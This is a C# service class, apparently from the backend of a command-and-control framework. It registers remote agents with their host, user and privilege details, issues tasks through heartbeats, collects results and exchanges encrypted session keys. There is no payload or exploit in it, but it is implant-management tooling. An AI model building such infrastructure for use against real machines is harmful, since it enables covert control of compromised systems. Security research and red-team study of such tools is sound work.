using LibraNextgen.Common.Models;
using LibraNextgen.Common.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Profiles;
using MongoDB.Driver;
using TaskStatus = LibraNextgen.Common.Models.TaskStatus;

namespace LibraNextgen.Service.Services;

public class AgentCommsService
{
    private readonly Repository<Agent> _agents;
    private readonly Repository<TrafficRecord> _traffic;
    private readonly TaskService _taskService;
    private readonly ProfileService _profileService;
    private readonly AgentTrafficService _trafficAccumulator;
    private readonly SessionKeyStore _sessionKeys;

    public AgentCommsService(
        Repository<Agent> agents,
        Repository<TrafficRecord> traffic,
        TaskService taskService,
        ProfileService profileService,
        AgentTrafficService trafficAccumulator,
        SessionKeyStore sessionKeys)
    {
        _agents = agents;
        _traffic = traffic;
        _taskService = taskService;
        _profileService = profileService;
        _trafficAccumulator = trafficAccumulator;
        _sessionKeys = sessionKeys;
    }

    public async Task<IMalleableProfile> GetActiveProfileAsync() =>
        await _profileService.GetActiveProfileAsync();

    public async Task<Agent?> GetAgentAsync(string agentId) =>
        await _agents.GetByIdAsync(agentId);

    /// <summary>
    /// Generate an AES-256 session key, encrypt it with the agent's RSA public
    /// key (SPKI + OAEP-SHA256) and store it keyed by agent id.
    /// Returns the base64-encoded RSA ciphertext to send back to the agent.
    /// </summary>
    public string? EstablishSessionKey(string agentId, string? publicKeyBase64)
    {
        if (string.IsNullOrWhiteSpace(publicKeyBase64))
            return null;

        // 已有会话密钥（agent 重连或服务重启后从 Mongo 恢复）——直接复用，
        // 返回 null 表示不下发新 key，agent 继续用旧 key，无需重新 RSA 协商。
        if (_sessionKeys.TryGet(agentId, out var existing) && existing is not null)
            return null;

        var key = CryptoHelper.GenerateAesKey();
        try
        {
            var encrypted = CryptoHelper.RsaEncrypt(key, publicKeyBase64);
            _sessionKeys.Set(agentId, key);
            return Convert.ToBase64String(encrypted);
        }
        catch
        {
            return null;
        }
    }

    public bool TryGetSessionKey(string agentId, out byte[]? key) =>
        _sessionKeys.TryGet(agentId, out key);

    public async Task<Agent?> HandleRegisterAsync(RegisterRequest request, string clientIp)
    {
        var hwid = request.Hardware?.Hwid;

        // Match by HWID first, fall back to Hostname + UserName
        Agent? existing = null;
        if (!string.IsNullOrEmpty(hwid))
            existing = await _agents.FirstOrDefaultAsync(a => a.Hwid == hwid);
        if (existing == null)
            existing = await _agents.FirstOrDefaultAsync(a => a.Hostname == request.Hostname && a.UserName == request.UserName);

        if (existing != null)
        {
            var ub = Builders<Agent>.Update;
            var updates = new List<UpdateDefinition<Agent>>
            {
                ub.Set(a => a.Status, AgentStatus.Online),
                ub.Set(a => a.LastSeen, DateTime.UtcNow),
                ub.Set(a => a.IpAddress, clientIp),
                ub.Set(a => a.Pid, request.Pid),
                ub.Set(a => a.IsElevated, request.IsElevated),
                ub.Set(a => a.OsVersion, request.OsVersion),
                ub.Set(a => a.Arch, request.Arch),
                ub.Set(a => a.ProcessName, request.ProcessName),
                ub.Set(a => a.PublicKey, request.PublicKey),
                ub.Set(a => a.Hwid, hwid)
            };
            if (request.Hardware != null) updates.Add(ub.Set(a => a.Hardware, request.Hardware));
            await _agents.UpdateAsync(existing.Id, Builders<Agent>.Update.Combine(updates));
            existing.PublicKey = request.PublicKey;
            existing.Hardware = request.Hardware;
            return existing;
        }

        var agent = new Agent
        {
            Hostname = request.Hostname,
            UserName = request.UserName,
            IpAddress = clientIp,
            OsVersion = request.OsVersion,
            Arch = request.Arch,
            ProcessName = request.ProcessName,
            Pid = request.Pid,
            IsElevated = request.IsElevated,
            PublicKey = request.PublicKey,
            Hardware = request.Hardware,
            Hwid = hwid,
            Status = AgentStatus.Online
        };
        await _agents.InsertAsync(agent);
        return agent;
    }

    public async Task<(bool valid, AgentTask? task, string hostname)> HandleHeartbeatAsync(string agentId)
    {
        var agent = await _agents.GetByIdAsync(agentId);
        if (agent == null)
            return (false, null, "");

        var ub = Builders<Agent>.Update;
        var update = Builders<Agent>.Update.Combine(
            ub.Set(a => a.LastSeen, DateTime.UtcNow),
            ub.Set(a => a.Status, AgentStatus.Online));
        await _agents.UpdateAsync(agentId, update);

        var task = await _taskService.GetNextPendingForAgentAsync(agentId);
        if (task != null)
        {
            await _taskService.UpdateStatusAsync(task.Id, TaskStatus.Sent);
        }

        return (true, task, agent.Hostname);
    }

    public void RecordTraffic(string agentId, string hostname, long bytesReceived, long bytesSent)
    {
        _trafficAccumulator.Accumulate(agentId, hostname, bytesReceived, bytesSent);
    }

    public async Task<bool> HandleResultAsync(
        string agentId, TaskResult result, long bytesReceived, long bytesSent)
    {
        var task = await _taskService.GetByIdAsync(result.TaskId);
        if (task == null || task.AgentId != agentId)
            return false;

        await _taskService.UpdateStatusAsync(
            result.TaskId,
            result.Success ? TaskStatus.Completed : TaskStatus.Failed,
            result.Output,
            result.Error);

        var agent = await _agents.GetByIdAsync(agentId);
        _trafficAccumulator.Accumulate(agentId, agent?.Hostname ?? "unknown", bytesReceived, bytesSent);

        return true;
    }

    public async Task<List<TrafficRecord>> GetTrafficAsync(int minutes = 30)
    {
        var since = DateTime.UtcNow.AddMinutes(-minutes);
        return await _traffic.FindAsync(t => t.Timestamp >= since);
    }
}

public class RegisterRequest
{
    public string Hostname { get; set; } = string.Empty;
    public string UserName { get; set; } = string.Empty;
    public string OsVersion { get; set; } = string.Empty;
    public string Arch { get; set; } = string.Empty;
    public string ProcessName { get; set; } = string.Empty;
    public int Pid { get; set; }
    public bool IsElevated { get; set; }
    public string? PublicKey { get; set; }
    public string? BeaconSecret { get; set; }
    public HardwareInfo? Hardware { get; set; }
}

public class HeartbeatResponse
{
    public string Status { get; set; } = "ok";
    public AgentTask? PendingTask { get; set; }
}

public class TaskResult
{
    public string TaskId { get; set; } = string.Empty;
    public bool Success { get; set; }
    public string? Output { get; set; }
    public string? Error { get; set; }
}
